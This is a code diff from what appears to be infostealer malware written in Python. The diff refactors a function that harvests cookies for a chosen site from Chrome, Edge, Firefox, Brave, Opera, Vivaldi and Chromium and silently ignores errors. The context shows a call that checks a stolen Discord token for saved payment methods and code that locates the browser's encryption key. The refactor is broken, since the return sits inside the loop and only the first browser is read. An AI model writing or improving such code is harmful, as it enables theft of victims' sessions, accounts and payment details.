@@ -35,37 +35,23 @@ def has_payment_methods(tk):
     response=get('https://discordapp.com/api/v6/users/@me/billing/payment-sources',  headers=headers).json()
     return response
 
-def cookies_grabber_mod(site):
+def cookies_grabber_mod(u):
     cookies = []
-    try:
-        cookies.append(str(browser_cookie3.chrome(domain_name=site)))
-    except:
-        pass
-    try:
-        cookies.append(str(browser_cookie3.edge(domain_name=site)))
-    except:
-        pass
-    try:
-        cookies.append(str(browser_cookie3.firefox(domain_name=site)))
-    except:
-        pass
-    try:
-        cookies.append(str(browser_cookie3.brave(domain_name=site)))
-    except:
-        pass
-    try:
-        cookies.append(str(browser_cookie3.opera(domain_name=site)))
-    except:
-        pass
-    try:
-        cookies.append(str(browser_cookie3.vivaldi(domain_name=site)))
-    except:
-        pass
-    try:
-        cookies.append(str(browser_cookie3.chromium(domain_name=site)))
-    except:
-        pass
-    return cookies
+    browsers = [
+        "chrome",
+        "edge",
+        "firefox",
+        "brave",
+        "opera",
+        "vivaldi",
+        "chromium",
+    ]
+    for browser in browsers:
+        try:
+            cookies.append(str(getattr(browser_cookie3, browser)(domain_name=u)))
+        except:
+            pass
+        return cookies
 
 def get_encryption_key():
     local_state_path = os.path.join(os.environ["USERPROFILE"],
